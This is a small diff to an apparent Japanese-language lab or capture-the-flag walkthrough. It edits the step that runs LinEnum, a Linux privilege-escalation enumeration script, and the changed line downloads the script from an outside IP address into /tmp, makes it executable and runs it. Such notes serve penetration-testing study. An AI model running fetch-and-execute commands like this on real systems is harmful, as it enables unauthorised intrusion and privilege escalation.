@@ -21,8 +21,7 @@
 
 ## 2. LinEnum の実行
 ```
-wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh
-cd /tmp && ./LinEnum.sh
+wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh; /tmp/LinEnum.sh
 ```
 
 ## 3. ホームディレクトリの確認
